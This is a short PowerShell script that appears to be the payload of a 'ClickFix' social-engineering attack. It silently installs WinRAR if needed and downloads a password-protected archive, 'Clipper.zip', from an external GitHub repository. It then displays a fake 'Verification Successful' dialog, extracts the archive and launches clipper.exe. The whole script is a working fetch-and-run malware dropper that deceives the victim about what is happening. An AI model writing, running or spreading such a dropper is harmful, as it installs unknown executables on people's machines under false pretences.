Add-Type -AssemblyName System.Windows.Forms
$winrarPath = 'C:\Program Files\WinRAR\WinRAR.exe'
if (-not (Test-Path $winrarPath)) {
    Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-731.exe' -OutFile "$env:TEMP\winrar-installer.exe"
    Start-Process -FilePath "$env:TEMP\winrar-installer.exe" -ArgumentList '/S' -Wait
    Remove-Item "$env:TEMP\winrar-installer.exe"
}
Invoke-WebRequest -Uri 'https://github.com/0xL10NZ/clickfix-files/raw/refs/heads/main/Clipper.zip' -OutFile "$env:TEMP\Clipper.zip"
[System.Windows.Forms.MessageBox]::Show('Verification Successful','ClickFix')
& $winrarPath x -p'yourzippassword' "$env:TEMP\Clipper.zip" "$env:TEMP\clipper\" -y
Start-Process -FilePath "$env:TEMP\clipper\clipper.exe"
Add-Content -Path "$env:TEMP\clickfix.log" -Value "[$(Get-Date)] ZIP extracted and executed"
